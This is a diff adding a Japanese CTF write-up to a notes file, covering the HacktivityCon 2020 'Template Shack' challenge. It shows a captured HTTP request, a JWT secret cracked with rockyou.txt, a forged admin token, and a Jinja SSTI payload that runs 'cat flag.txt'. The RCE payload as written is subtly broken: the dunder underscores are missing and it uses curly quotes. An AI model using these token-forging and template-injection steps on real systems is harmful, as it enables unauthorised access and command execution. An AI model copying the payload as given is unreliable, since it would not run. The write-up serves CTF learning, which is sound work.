@@ -1374,11 +1374,47 @@ if __name__ == "__main__":
     application.listen(8888)
     tornado.ioloop.IOLoop.instance().start()
 ```
-## sample
+## jinja RCE / JWT's secret_key crack (HacktivityConCTF 2020 Template Shack)
 https://dunsp4rce.github.io/HacktivityCon-CTF/web/2020/08/03/Template-Shack.html   
 - **entrypoint**    
+JWTがあって、中身は`{  "username": "guest"}`なのでこれを`"admin"`に改竄するために、署名の秘密鍵を辞書攻撃で特定する。そのあと、adminとしてログインしたページのerrorページにユーザーの入力が入っているのでSSTIを試す。   
 - **概要**    
+リクエスト内容を見ると以下のようにJWTによってログインしてるかどかが管理されている。   
+JWTについては以下。   
+https://qiita.com/t-toyota/items/8d0ffb265845ab8cc87c   
+```txt
+GET / HTTP/1.1
+Host: jh2i.com:50023
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+JWTではJSONがBase64でエンコードされてるもの＋署名を付けて改竄されているかどうかを確認している。   
+https://github.com/lmammino/jwt-cracker   
+このツールでJWTの鍵を辞書攻撃できるらしい。   
+```txt
+Command: 
+
+python3 crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y /usr/share/wordlists/rockyou.txt
+
+Output:
+
+Cracking JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y
+291167it [00:26, 11150.29it/s]Found secret key: supersecret
+291167it [00:26, 10911.29it/s]
+```
+https://jwt.io/   
+ここで`VERIFY SIGNATURE`に`supersecret`を入れた状態で作成された`{  "username": "admin"}`のJWTを使えば`admin`としてログインできる！   
 - **Payload**    
+JWTを付与して、`/admin/{{7*7}}`とかをすると49が返るのでSSTI可能！   
+```txt
+/admin/{{request.application.globals.builtins.import(‘os’).popen(‘cat flag.txt’).read()}}
+```
 ## sample
 - **entrypoint**    
 - **概要**    
